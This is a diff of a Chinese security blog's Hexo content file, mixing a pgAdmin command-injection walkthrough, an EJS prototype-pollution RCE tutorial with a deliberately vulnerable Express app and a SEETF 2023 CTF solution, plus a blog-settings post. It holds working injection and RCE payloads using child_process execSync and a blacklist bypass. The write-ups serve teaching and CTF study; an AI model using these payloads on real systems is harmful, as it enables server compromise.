-<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
-<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
-<ul>
-<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
-<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
-</ul>
-<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
-<p>Windows下返回结果为True</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
-<p>而Linux下返回结果为False</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
-<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
-<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
-<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
-<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
-<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
+<p>我们可以知道将<code>opts.escapeFunction</code>赋值给<code>escapeFn</code>，如果<code>opts.client</code>存在，那么<code>escapeFn</code>就会在函数体内从而被调用</p>
+<p>由于 opts.client 和 opts.escapeFunction 默认情况下未设置，因此可以原型链污染它们到达eval接收器并实现RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;__proto__&quot;: &#123;</span><br><span class="line">        &quot;client&quot;: 1,</span><br><span class="line">        &quot;escapeFunction&quot;: &quot;JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;calc&#x27;)&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
-<p>成功命令执行</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
+
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Setup app</span><br><span class="line">const express = require(&quot;express&quot;);</span><br><span class="line">const app  = express();</span><br><span class="line">const port = 3000;</span><br><span class="line"></span><br><span class="line">// Select ejs templating library</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">// Routes</span><br><span class="line">app.get(&quot;/&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    res.render(&quot;index&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(&quot;/vuln&quot;, (req, res) =&gt; &#123;</span><br><span class="line">    // simulate SSPP vulnerability</span><br><span class="line">    var a = req.query.a;</span><br><span class="line">    var b = req.query.b;</span><br><span class="line">    var c = req.query.c;</span><br><span class="line"></span><br><span class="line">    var obj = &#123;&#125;;</span><br><span class="line">    obj[a][b] = c;</span><br><span class="line"></span><br><span class="line">    res.send(&quot;OK!&quot;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">// Start app</span><br><span class="line">app.listen(port, () =&gt; &#123;</span><br><span class="line">    console.log(`App listening on port $&#123;port&#125;`)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>GET传参payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">第一次: /vuln?a=__proto__&amp;b=escapeFunction&amp;c=JSON.stringify; process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;calc&#x27;)</span><br><span class="line">第二次: /vuln?a=__proto__&amp;b=client&amp;c=true</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106163117582.png"></p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p><strong>[SEETF 2023]Express JavaScript Security</strong></p>
+<p>源码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">const ejs = require(&#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);</span><br><span class="line"></span><br><span class="line">const BLACKLIST = [</span><br><span class="line">    &quot;outputFunctionName&quot;,</span><br><span class="line">    &quot;escapeFunction&quot;,</span><br><span class="line">    &quot;localsName&quot;,</span><br><span class="line">    &quot;destructuredLocals&quot;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    return res.render(&#x27;index&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(&#x27;/greet&#x27;, (req, res) =&gt; &#123;</span><br><span class="line">    </span><br><span class="line">    const data = JSON.stringify(req.query);</span><br><span class="line"></span><br><span class="line">    if (BLACKLIST.find((item) =&gt; data.includes(item))) &#123;</span><br><span class="line">        return res.status(400).send(&#x27;Can you not?&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return res.render(&#x27;greet&#x27;, &#123;</span><br><span class="line">        ...JSON.parse(data),</span><br><span class="line">        cache: false</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Server listening on port 3000&#x27;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>分析一下，<code>app.set(&#39;view engine&#39;, &#39;ejs&#39;);</code>说明ejs模板是默认配置，在<code>/greet</code>路由下，接收GET参数并赋值给data变量，然后黑名单检测，调用ejs模板进行渲染其中解析data的json数据，说明ejs配置可控。</p>
+<p>我们前文利用的payload是有escapeFunction关键字的，并且污染的过程是我们手动添加<code>/vuln</code>上去的，所以我们要寻找可以利用的地方</p>
+<p>通常情况下，ejs模板只允许在数据对象中传递以下相对无害的选项</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var _OPTS_PASSABLE_WITH_DATA = [&#x27;delimiter&#x27;, &#x27;scope&#x27;, &#x27;context&#x27;, &#x27;debug&#x27;, &#x27;compileDebug&#x27;,</span><br><span class="line">  &#x27;client&#x27;, &#x27;_with&#x27;, &#x27;rmWhitespace&#x27;, &#x27;strict&#x27;, &#x27;filename&#x27;, &#x27;async&#x27;];</span><br><span class="line">// We don&#x27;t allow &#x27;cache&#x27; option to be passed in the data obj for</span><br><span class="line">// the normal `render` call, but this is where Express 2 &amp; 3 put it</span><br><span class="line">// so we make an exception for `renderFile`</span><br><span class="line">var _OPTS_PASSABLE_WITH_DATA_EXPRESS = _OPTS_PASSABLE_WITH_DATA.concat(&#x27;cache&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>但是我们找到<code>settings[&#39;view options&#39;]</code>可用于将任意选项传递给EJS，这将是我们利用的点</p>
+<p>跟进一下，会调用shallowCopy()进行赋值给opts</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">viewOpts = data.settings[&#x27;view options&#x27;];</span><br><span class="line">if (viewOpts) &#123;</span><br><span class="line">  utils.shallowCopy(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而在渲染模板的时候会跟进到Template类中，发现关键语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;</span><br></pre></td></tr></table></figure>
+
+<p>也就是说虽然escapeFunction被过滤了，但是我们可以利用opts.escape去替换</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">settings[&#x27;view options&#x27;][escape]=...</span><br></pre></td></tr></table></figure>
+
+<p>将前文漏洞利用的payload稍加修改一下，然后添加上greet.ejs中的三个配置参数</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106171750370.png"></p>
+<p>得到最终payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/greet?name=test&amp;font=test&amp;fontSize=test&amp;settings[view options][escape]=function()&#123;return process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;)&#125;&amp;settings[view options][client]=1</span><br></pre></td></tr></table></figure>
+
+<p>注：题目源码已经<code>JSON.stringify</code>了，<code>/readflag</code>可以在dockerfile中得到信息</p>
+<p><img src="/article/ejs%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20240106175700268.png"></p>
 ]]></content>
       <categories>
-        <category>漏洞分析</category>
+        <category>web安全</category>
       </categories>
-  </entry>
-  <entry>
-    <title>博客常用设置</title>
-    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
-    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
-<span id="more"></span>
-
-
-
-<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
-
-<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
+      <tags>
+        <tag>模板注入</tag>
+        <tag>原型链污染</tag>
+      </tags>
   </entry>
   <entry>
     <title>红明谷杯2024</title>
@@ -2499,6 +2574,30 @@
 ]]></content>
       <categories>
         <category>漏洞分析</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>博客常用设置</title>
+    <url>/article/%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E8%AE%BE%E7%BD%AE.html</url>
+    <content><![CDATA[<p>一些基于hexo搭建的博客的基本设置</p>
+<span id="more"></span>
+
+
+
+<h1 id="博客常用设置"><a href="#博客常用设置" class="headerlink" title="博客常用设置"></a>博客常用设置</h1><h2 id="本地部署"><a href="#本地部署" class="headerlink" title="本地部署"></a>本地部署</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="发表文章"><a href="#发表文章" class="headerlink" title="发表文章"></a>发表文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo cl &amp; hexo &amp; hexo g &amp; hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="设置标题"><a href="#设置标题" class="headerlink" title="设置标题"></a>设置标题</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: Clicker-HackTheBox</span><br><span class="line">tags:</span><br><span class="line">  - 提权</span><br><span class="line">categories:</span><br><span class="line">  - HTB-writeup</span><br><span class="line">date: 2024-1-10</span><br><span class="line">abbrlink: 6d2044b3</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">session伪造、perl_startup提权</span><br><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>&lt;!-- more --&gt;</code>标签可以使文章只展示前文概要，阅读整篇文章需要点击进去</p>
+]]></content>
+      <categories>
+        <category>杂项</category>
       </categories>
   </entry>
   <entry>
